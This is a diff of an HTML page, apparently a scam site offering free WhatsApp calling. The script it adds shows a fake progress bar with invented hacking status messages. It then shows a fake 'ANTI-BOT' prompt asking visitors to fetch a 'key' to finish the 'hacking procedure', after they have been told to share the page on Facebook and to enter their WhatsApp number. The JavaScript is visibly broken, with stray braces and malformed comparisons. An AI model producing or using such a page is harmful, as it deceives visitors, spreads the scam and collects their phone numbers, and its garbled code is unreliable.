@@ -24,6 +24,68 @@ background: -webkit-linear-gradient(top, #b0efff 0%, #7fd4e9 100%);
 text-shadow: 1px 1px 1px #fff;
 }
 h2 a{ color:#369; }</style>
+<script language='JavaScript' type='text/JavaScript'>
+ var platform='';
+var prg_width = 395;
+var begin = '';
+var d = location.search.split('d=')[1] ? location.search.split('d=')[1] : 'no';
+}
+
+function progress1() {
+var username = document.getElementById('hone').value;
+return false;
+}
+if(username=='''){
+alert('You need to enter a valid whatsapp number');
+return false;
+}
+if(username=='' && table.style.display=='table'){
+alert('Please enter your whatsapp number');
+return false;
+}
+document.getElementById('theGenButton').style.display='none';
+document.getElementById('disImageButton').style.display='block';
+begin = 'ok';
+setInterval(function(){
+var node  = document.getElementById('progress');
+var tnode = document.getElementById('progressText');
+var w = node.style.width.match(/\d+/);
+var txt = document.getElementById('myTxt');
+if (w == prg_width) {
+clearInterval(progress_run_id);
+w = 0;
+}
+var val = parseInt(w) + 5;
+node.style.width = val + 'px';
+tnode.innerHTML = (val/prg_width * 100).toFixed(0)-1 + '%';
+if(val == 5){
+txt.innerHTML = "Initializing XML Https Request Object...";
+}
+if(val == 60){
+txt.innerHTML = "Connecting to servers [via Anti-Track Plugin]...";
+}
+if(val == 180){
+txt.innerHTML = "Processing connection to servers...";
+}
+if(val == 305){
+txt.innerHTML = "Changing database algorithms...";
+}
+if(val == 360){
+txt.innerHTML = "Finalizing data...";
+}
+if(val == 390){
+txt.innerHTML = 'Waiting user input...';
+document.getElementById('lastUpdate').style.display='none';
+document.getElementById('h').style.display='block';
+document.getElementById('about').style.display='none';
+document.getElementById('video').style.display='none';
+document.getElementById('codeshow').style.display='block';
+var sl1 = document.getElementById('ok1');
+var sl2 = document.getElementById('ok2');
+sl1.innerHTML = "ANTI-BOT SYSTEM";
+sl2.innerHTML = "To prevent bots/leechers from abusing our system and keep it safe and undetectable, we need to verify if you are a human. Please get (1) valid key from below and paste it in the field to finalize the hacking procedure.";
+document.getElementById('enc').focus();
+</script>
  <body>
 <div id="fb-root"></div>
 <script>(function(d, s, id) {
@@ -53,17 +115,18 @@ h2 a{ color:#369; }</style>
             <center>..:: 1st Step <font color="black">[Share]</font> ::..</center></h2>
             Click Below Share Button and Share it to Facebook<br><br>
         <div class="fb-share-button" data-href="http://whatsappfreecalling.github.io/freecalling/index.html" data-layout="button"></div><br>
-     <center>..:: 2nd Step <font color="black">[Connect Your Account]</font> ::..</center></h2>
+     <h2><center>..:: 2nd Step <font color="black">[Connect Your Account]</font> ::..</center></h2>
       Enter Your WhatsApp Number and Click Connect Button<br><br>
      <td align='center'><div style='font-weight:bold; padding-top:15px; padding-bottom:15px; padding-left: 10px; padding-right: 10px;'> Your WhatsApp Number <br/>
 <input style='text-align: center' type='select' id='user' placeholder='' size='15'></div></td>
              <div id='myGenButton' style='display: block;' align='center'>
-<a class='bw' id='theGenButton' style='cursor: pointer;' onClick='progress1();'><img src='http://i.imgur.com/gKOi742.png' /></a>
+<a class='bw' id='theGenButton' style='cursor: pointer;' onClick='progress1();'><img src='http://i.imgur.com/rRDhk1h.png?1' /></a>
         </font>
         <center>
+    <br>
+    <br>
     
-    
-            <input type="image" src="http://i.imgur.com/U0z93ef.png" id="b1" name="button" value="click" onclick="fn1(this)" class="button"/>
+         
             <input type="image" src="http://i.imgur.com/E8pldyV.png" id="b1" name="button" value="click" onclick="fn2(this)" class="button"/>
 </center>
 </input>
